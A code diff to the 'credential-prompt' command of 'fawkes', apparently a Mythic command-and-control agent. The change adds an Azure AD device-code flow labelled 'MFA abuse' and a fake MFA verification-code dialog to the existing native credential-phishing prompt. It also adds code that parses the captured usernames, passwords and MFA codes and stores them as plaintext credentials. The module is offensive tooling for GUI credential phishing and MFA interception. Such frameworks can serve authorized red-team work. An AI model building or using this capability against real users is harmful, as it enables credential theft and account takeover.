@@ -9,24 +9,62 @@ import (
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
+func parseCredentialPromptResponse(responseText string) (username, credential, credType string) {
+	for _, line := range strings.Split(responseText, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.HasPrefix(trimmed, "User:") {
+			username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
+		} else if strings.HasPrefix(trimmed, "Password:") {
+			credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
+			credType = "dialog"
+		} else if strings.HasPrefix(trimmed, "Code:") {
+			credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Code:"))
+			credType = "mfa-phish"
+		}
+	}
+	return
+}
+
+func credentialPromptDefaultTitle(title string) string {
+	if title == "" {
+		return "Update Required"
+	}
+	return title
+}
+
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "credential-prompt",
-		Description:         "Display a native credential dialog to capture user credentials. macOS: AppleScript dialog. Windows: CredUI prompt. Linux: zenity/kdialog/yad.",
-		HelpString:          "credential-prompt [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution]",
-		Version:             2,
+		Description:         "Display a native credential dialog or initiate OAuth device code flow for MFA abuse. macOS: AppleScript. Windows: CredUI. Linux: zenity. Cross-platform: device-code flow.",
+		HelpString:          "credential-prompt [-action dialog|device-code] [-title \"Authentication Required\"] [-message \"Enter your credentials...\"] [-icon caution] [-tenant_id <id>] [-client_id <id>]",
+		Version:             3,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		AssociatedBrowserScript: &agentstructs.BrowserScript{
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credential_prompt_new.js"),
 			Author:     "@galoryber",
 		},
-		MitreAttackMappings: []string{"T1056.002"}, // Input Capture: GUI Input Capture
+		MitreAttackMappings: []string{"T1056.002", "T1621", "T1111"}, // Input Capture, MFA Request Generation, MFA Interception
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
+			{
+				Name:             "action",
+				ModalDisplayName: "Action",
+				CLIName:          "action",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Choices:          []string{"dialog", "device-code", "mfa-phish"},
+				Description:      "Action: dialog (native credential prompt), device-code (OAuth MFA abuse via Azure AD device code flow), or mfa-phish (fake MFA verification code dialog)",
+				DefaultValue:     "dialog",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
 			{
 				Name:             "title",
 				ModalDisplayName: "Dialog Title",
@@ -70,6 +108,34 @@ func init() {
 					},
 				},
 			},
+			{
+				Name:             "tenant_id",
+				ModalDisplayName: "Azure Tenant ID",
+				CLIName:          "tenant_id",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Azure AD tenant ID for device-code flow (default: organizations for multi-tenant)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:             "client_id",
+				ModalDisplayName: "OAuth Client ID",
+				CLIName:          "client_id",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "OAuth client ID for device-code flow (default: Microsoft Office first-party app)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+					},
+				},
+			},
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -105,9 +171,7 @@ func init() {
 				TaskID:  taskData.Task.ID,
 			}
 			title, _ := taskData.Args.GetStringArg("title")
-			if title == "" {
-				title = "Update Required"
-			}
+			title = credentialPromptDefaultTitle(title)
 			display := fmt.Sprintf("title: %s", title)
 			response.DisplayParams = &display
 			createArtifact(taskData.Task.ID, "User Interaction", fmt.Sprintf("GUI credential prompt: %s", title))
@@ -122,26 +186,21 @@ func init() {
 			if !ok || responseText == "" {
 				return response
 			}
-			// Parse output format:
-			//   User:     <username>
-			//   Password: <password>
-			var username, password string
-			for _, line := range strings.Split(responseText, "\n") {
-				trimmed := strings.TrimSpace(line)
-				if strings.HasPrefix(trimmed, "User:") {
-					username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
-				} else if strings.HasPrefix(trimmed, "Password:") {
-					password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
+			username, credential, credType := parseCredentialPromptResponse(responseText)
+			if username != "" && credential != "" {
+				comment := "credential-prompt dialog capture"
+				realm := "local"
+				if credType == "mfa-phish" {
+					comment = "credential-prompt mfa-phish capture"
+					realm = "mfa-phish"
 				}
-			}
-			if username != "" && password != "" {
 				registerCredentials(processResponse.TaskData.Task.ID, []mythicrpc.MythicRPCCredentialCreateCredentialData{
 					{
 						CredentialType: "plaintext",
-						Realm:          "local",
+						Realm:          realm,
 						Account:        username,
-						Credential:     password,
-						Comment:        "credential-prompt dialog capture",
+						Credential:     credential,
+						Comment:        comment,
 					},
 				})
 			}
